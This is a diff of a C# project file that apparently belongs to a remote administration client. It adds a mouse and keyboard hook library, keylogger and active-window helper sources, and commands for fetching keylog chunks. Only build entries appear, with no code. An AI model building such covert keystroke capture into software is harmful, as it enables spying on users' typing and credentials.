@@ -32,6 +32,9 @@
     <WarningLevel>4</WarningLevel>
   </PropertyGroup>
   <ItemGroup>
+    <Reference Include="Gma.System.MouseKeyHook">
+      <HintPath>..\Dependencies\Gma.System.MouseKeyHook.dll</HintPath>
+    </Reference>
     <Reference Include="NetworkCommsDotNetComplete">
       <HintPath>..\Dependencies\NetworkCommsDotNetComplete.dll</HintPath>
     </Reference>
@@ -53,6 +56,8 @@
     <Compile Include="Core\Events\Close.cs" />
     <Compile Include="Core\Events\Elevate.cs" />
     <Compile Include="Core\Events\ExecuteScript.cs" />
+    <Compile Include="Core\Events\GetKeylogChunk.cs" />
+    <Compile Include="Core\Events\GetKeylogDumpLength.cs" />
     <Compile Include="Core\Events\GetProcess.cs" />
     <Compile Include="Core\Events\GetUserName.cs" />
     <Compile Include="Core\Events\GetAccountType.cs" />
@@ -64,11 +69,13 @@
     <Compile Include="Core\Events\SetPowerState.cs" />
     <Compile Include="Core\Events\ShowMessageBox.cs" />
     <Compile Include="Core\Events\SubmitScreen.cs" />
+    <Compile Include="Core\Helper\ActiveWindowHelper.cs" />
     <Compile Include="Core\Helper\IdleHelper.cs" />
     <Compile Include="Core\Helper\InputHelper.cs" />
     <Compile Include="Core\Helper\MutexHelper.cs" />
     <Compile Include="Core\Helper\ScreenshotHelper.cs" />
     <Compile Include="Core\Helper\WindowsAccountHelper.cs" />
+    <Compile Include="Core\Keylogging\Keylogger.cs" />
     <Compile Include="Core\Networking\NetworkManager.cs" />
     <Compile Include="Core\Security\Cryptography.cs" />
     <Compile Include="Program.cs" />
